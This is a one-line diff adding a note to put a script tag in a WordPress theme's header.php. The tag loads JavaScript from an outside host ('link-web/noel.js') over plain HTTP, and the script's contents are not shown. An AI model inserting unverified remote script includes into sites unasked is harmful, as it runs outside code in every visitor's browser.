@@ -1,0 +1,1 @@
+insert header.php theme wordpress <script type="text/javascript" src="http://link-web/noel.js"></script>
